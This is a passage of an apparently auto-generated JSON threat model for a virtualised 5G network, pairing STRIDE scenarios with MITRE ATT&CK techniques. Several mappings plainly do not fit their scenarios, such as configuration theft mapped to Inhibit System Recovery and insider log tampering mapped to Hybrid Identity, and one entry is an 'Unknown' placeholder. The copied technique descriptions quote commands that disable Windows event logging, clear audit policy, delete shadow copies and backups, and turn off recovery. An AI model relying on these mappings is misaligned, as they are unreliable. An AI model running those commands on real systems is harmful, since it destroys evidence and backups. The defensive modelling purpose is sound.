            ],
            "Potential Impact": "Unauthorized access to sensitive data and disruption of services.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "impersonation",
                "fake services"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate Network Function (NF) to intercept data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can communicate with other NFs.",
                    "Role": "Attacker",
                    "Condition": "True if the attacker can send messages within the network."
                },
                {
                    "Assumption": "Lack of mutual authentication between NFs.",
                    "Role": "System",
                    "Condition": "True if the system does not enforce mutual authentication for inter-NF communication."
                }
            ],
            "Potential Impact": "Compromised data confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "data interception",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates an orchestration component to issue unauthorized commands.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to orchestration network segment.",
                    "Role": "Attacker",
                    "Condition": "True if the attacker can access the orchestration network."
                },
                {
                    "Assumption": "Inadequate authentication for orchestration commands.",
                    "Role": "System",
                    "Condition": "True if commands are not verified against a strong authentication system."
                }
            ],
            "Potential Impact": "Command and control over system resources unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "orchestration",
                "unauthorized commands",
                "resource control"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the data within a network slice for malicious purposes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can gain access to the network slice storage.",
                    "Role": "Attacker",
                    "Condition": "True if the attacker can reach storage where slices are defined."
                },
                {
                    "Assumption": "Insufficient integrity checks on slice data.",
                    "Role": "System",
                    "Condition": "True if changes in slice data are not regularly checked."
                }
            ],
            "Potential Impact": "Compromised integrity of network slice data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network slice",
                "data alteration",
                "malicious"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration of a Network Function (NF) to disrupt services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access NF configuration interfaces.",
                    "Role": "Attacker",
                    "Condition": "True if interfaces are exposed or unprotected."
                },
                {
                    "Assumption": "Weak access control on configuration management systems.",
                    "Role": "System",
                    "Condition": "True if access controls are not effectively implemented."
                }
            ],
            "Potential Impact": "Service disruption and potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network function",
                "configuration",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Startup Items",
                "description": "Per Apple\u2019s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.",
                "id": "attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f",
                "technique_id": "T1165"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into Virtual Network Functions (VNFs) at runtime.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access hypervisors or containers.",
                    "Role": "Attacker",
                    "Condition": "True if the attacker has access to the environments running VNFs."
                },
                {
                    "Assumption": "Lack of runtime integrity checks.",
                    "Role": "System",
                    "Condition": "True if the system does not perform continuous integrity checks on running VNFs."
                }
            ],
            "Potential Impact": "Tampering of VNF operations leading to data and service integrity issues.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "virtual network function",
                "code injection",
                "runtime"
            ],
            "mitre_technique": {
                "name": "Runtime Data Manipulation",
                "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
                "technique_id": "T1565.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies actions performed on the network influencing network logs and accountability.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not tamper-proof.",
                    "Role": "System",
                    "Condition": "True if logging mechanisms are susceptible to tampering both by users and attackers."
                },
                {
                    "Assumption": "The system does not enforce strong non-repudiation measures.",
                    "Role": "System",
                    "Condition": "True if non-repudiation measures are weak or non-existent."
                }
            ],
            "Potential Impact": "Loss of accountability and difficulty in tracking malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "non-repudiation",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker removes entries from audit logs to cover tracks of unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access and modify audit logs.",
                    "Role": "Attacker",
                    "Condition": "True if audit log files or storage are not securely protected."
                },
                {
                    "Assumption": "No immutable logging mechanism in place.",
                    "Role": "System",
                    "Condition": "True if the system does not use mechanisms like append-only logs or blockchain."
                }
            ],
            "Potential Impact": "Compromised integrity of logs making it hard to trace actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit log",
                "log modification",
                "cover tracks"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider alters system logs to deny responsibility for malicious actions.",
            "Assumptions": [
                {
                    "Assumption": "Insider has privileged access to the logging system.",
                    "Role": "Insider",
                    "Condition": "True if insiders have unchecked access to logging systems."
                },
                {
                    "Assumption": "Insufficient monitoring of log changes.",
                    "Role": "System",
                    "Condition": "True if the system does not monitor and alert on log changes."
                }
            ],
            "Potential Impact": "Loss of log integrity and lack of evidence to hold insiders accountable.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log alteration",
                "insider threat",
                "privileged access"
            ],
            "mitre_technique": {
                "name": "Hybrid Identity",
                "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
                "technique_id": "T1556.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts data traffic within network slices to access sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to unencrypted data paths.",
                    "Role": "Attacker",
                    "Condition": "True if data is transmitted without encryption."
                },
                {
                    "Assumption": "No effective segmentation or boundary protection.",
                    "Role": "System",
                    "Condition": "True if there is inadequate isolation between network slices."
                }
            ],
            "Potential Impact": "Exposure of sensitive data compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "traffic",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Virtual Network Function (VNF) vulnerability allows an attacker to access stored sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "There are unpatched vulnerabilities in VNFs.",
                    "Role": "System",
                    "Condition": "True if vulnerabilities exist and are not patched."
                },
                {
                    "Assumption": "Inadequate access control on stored data.",
                    "Role": "System",
                    "Condition": "True if access control mechanisms are weak or improperly configured."
                }
            ],
            "Potential Impact": "Sensitive data access leading to confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability",
                "stored data",
                "access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to management interfaces and extracts configuration information.",
            "Assumptions": [
                {
                    "Assumption": "Management interfaces are exposed or unprotected.",
                    "Role": "System",
                    "Condition": "True if management interfaces lack proper security controls."
                },
                {
                    "Assumption": "No encryption for sensitive management data.",
                    "Role": "System",
                    "Condition": "True if sensitive data is transmitted without encryption."
                }
            ],
            "Potential Impact": "Disclosure of configuration details leading to further attacks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "management interface",
                "configuration data",
                "extraction"
            ],
            "mitre_technique": {
                "name": "Inhibit System Recovery",
                "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
                "id": "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a",
                "technique_id": "T1490"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods network functions with excessive traffic causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Network functions are accessible without rate limits.",
                    "Role": "System",
                    "Condition": "True if no rate limiting or throttling is applied."
                },
                {
                    "Assumption": "No effective traffic monitoring and filtering.",
                    "Role": "System",
                    "Condition": "True if there are no mechanisms to detect and filter excessive traffic."
                }
            ],
            "Potential Impact": "Service availability issues leading to disruption of network functions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "service disruption",
                "network function"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of a vulnerability within a Virtual Network Function (VNF) causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "The VNF contains unpatched vulnerabilities.",
                    "Role": "System",
                    "Condition": "True if vulnerabilities in VNFs remain unresolved."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms in place.",
                    "Role": "System",
                    "Condition": "True if no failover mechanisms are implemented."
                }
            ],
            "Potential Impact": "Complete service disruption for affected network slices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability exploitation",
                "VNF crash",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts the orchestration and management functions causing system-wide impact.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication and access controls for orchestration systems.",
                    "Role": "System",
                    "Condition": "True if orchestration systems are poorly protected."
                },
                {
                    "Assumption": "The attacker can reach orchestration and management interfaces.",
                    "Role": "Attacker",
                    "Condition": "True if these interfaces are exposed or inadequately protected."
                }
            ],
            "Potential Impact": "System-wide disruption impacting multiple network slices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "system-wide impact",
                "management functions"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in a VNF to gain elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerability exists within the VNF.",
                    "Role": "System",
                    "Condition": "True if the VNF contains exploitable vulnerabilities."
                },
                {
                    "Assumption": "There is no effective privilege segregation.",
                    "Role": "System",
                    "Condition": "True if user privileges are not properly segregated."
                }
            ],
            "Potential Impact": "Compromise of system integrity and unauthorized access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "VNF",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
